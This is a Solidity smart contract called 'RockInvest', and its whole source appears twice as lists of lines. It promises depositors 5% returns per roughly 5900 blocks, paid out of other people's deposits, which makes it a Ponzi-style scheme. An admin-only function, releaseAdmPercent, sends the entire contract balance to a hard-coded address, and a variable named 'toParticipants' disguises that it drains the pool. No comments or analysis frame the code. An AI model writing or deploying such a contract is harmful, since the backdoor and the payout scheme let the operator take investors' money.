['pragma solidity ^0.4.25;\n', ' \n', 'library SafeMath {\n', '  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    if (_a == 0) {\n', '      return 0;\n', '    }\n', '    c = _a * _b;\n', '    assert(c / _a == _b);\n', '    return c;\n', '  }\n', ' \n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    return _a / _b;\n', '  }\n', ' \n', '  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    assert(_b <= _a);\n', '    return _a - _b;\n', '  }\n', ' \n', '  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    c = _a + _b;\n', '    assert(c >= _a);\n', '    return c;\n', '  }\n', '}\n', ' \n', '   \n', 'contract RockInvest {\n', '    using SafeMath for uint256;\n', '   \n', '   \n', '    address public constant admAddress = 0x35F55eBE0CAABaA7D0Ed7E6f4DbA414DF76EC4c4;\n', '    \n', '    mapping (address => uint256) deposited;\n', '    mapping (address => uint256) withdrew;\n', '    mapping (address => uint256) blocklock;\n', ' \n', '    uint256 public totalDepositedWei = 0;\n', '    uint256 public totalWithdrewWei = 0;\n', '    modifier admPercent(){\n', '        require(msg.sender == admAddress);\n', '        _;\n', '    }\n', ' \n', '    function() payable external {\n', '        if (deposited[msg.sender] != 0) {\n', '            address investor = msg.sender;\n', '            uint256 depositsPercents = deposited[msg.sender].mul(5).div(100).mul(block.number-blocklock[msg.sender]).div(5900);\n', '            investor.transfer(depositsPercents);\n', ' \n', '            withdrew[msg.sender] += depositsPercents;\n', '            totalWithdrewWei = totalWithdrewWei.add(depositsPercents);\n', '\t\t\t\n', '\t\t\t\n', '        }\n', ' \n', '       \n', '        blocklock[msg.sender] = block.number;\n', '        deposited[msg.sender] += msg.value;\n', ' \n', '        totalDepositedWei = totalDepositedWei.add(msg.value);\n', '    }\n', ' \n', '    function userDepositedWei(address _address) public view returns (uint256) {\n', '        return deposited[_address];\n', '    }\n', ' \n', '    function userWithdrewWei(address _address) public view returns (uint256) {\n', '        return withdrew[_address];\n', '    }\n', ' \n', '    function userDividendsWei(address _address) public view returns (uint256) {\n', '        return deposited[_address].mul(5).div(100).mul(block.number-blocklock[_address]).div(5900);\n', '    }\n', '   \n', '    function releaseAdmPercent() admPercent public {\n', '        uint256 toParticipants = this.balance;\n', '        admAddress.transfer(toParticipants);\n', '    }\n', ' \n', ' \n', '   \n', '    function bytesToAddress(bytes bys) private pure returns (address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '}']
['pragma solidity ^0.4.25;\n', ' \n', 'library SafeMath {\n', '  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    if (_a == 0) {\n', '      return 0;\n', '    }\n', '    c = _a * _b;\n', '    assert(c / _a == _b);\n', '    return c;\n', '  }\n', ' \n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    return _a / _b;\n', '  }\n', ' \n', '  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    assert(_b <= _a);\n', '    return _a - _b;\n', '  }\n', ' \n', '  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    c = _a + _b;\n', '    assert(c >= _a);\n', '    return c;\n', '  }\n', '}\n', ' \n', '   \n', 'contract RockInvest {\n', '    using SafeMath for uint256;\n', '   \n', '   \n', '    address public constant admAddress = 0x35F55eBE0CAABaA7D0Ed7E6f4DbA414DF76EC4c4;\n', '    \n', '    mapping (address => uint256) deposited;\n', '    mapping (address => uint256) withdrew;\n', '    mapping (address => uint256) blocklock;\n', ' \n', '    uint256 public totalDepositedWei = 0;\n', '    uint256 public totalWithdrewWei = 0;\n', '    modifier admPercent(){\n', '        require(msg.sender == admAddress);\n', '        _;\n', '    }\n', ' \n', '    function() payable external {\n', '        if (deposited[msg.sender] != 0) {\n', '            address investor = msg.sender;\n', '            uint256 depositsPercents = deposited[msg.sender].mul(5).div(100).mul(block.number-blocklock[msg.sender]).div(5900);\n', '            investor.transfer(depositsPercents);\n', ' \n', '            withdrew[msg.sender] += depositsPercents;\n', '            totalWithdrewWei = totalWithdrewWei.add(depositsPercents);\n', '\t\t\t\n', '\t\t\t\n', '        }\n', ' \n', '       \n', '        blocklock[msg.sender] = block.number;\n', '        deposited[msg.sender] += msg.value;\n', ' \n', '        totalDepositedWei = totalDepositedWei.add(msg.value);\n', '    }\n', ' \n', '    function userDepositedWei(address _address) public view returns (uint256) {\n', '        return deposited[_address];\n', '    }\n', ' \n', '    function userWithdrewWei(address _address) public view returns (uint256) {\n', '        return withdrew[_address];\n', '    }\n', ' \n', '    function userDividendsWei(address _address) public view returns (uint256) {\n', '        return deposited[_address].mul(5).div(100).mul(block.number-blocklock[_address]).div(5900);\n', '    }\n', '   \n', '    function releaseAdmPercent() admPercent public {\n', '        uint256 toParticipants = this.balance;\n', '        admAddress.transfer(toParticipants);\n', '    }\n', ' \n', ' \n', '   \n', '    function bytesToAddress(bytes bys) private pure returns (address addr) {\n', '        assembly {\n', '            addr := mload(add(bys, 20))\n', '        }\n', '    }\n', '}']
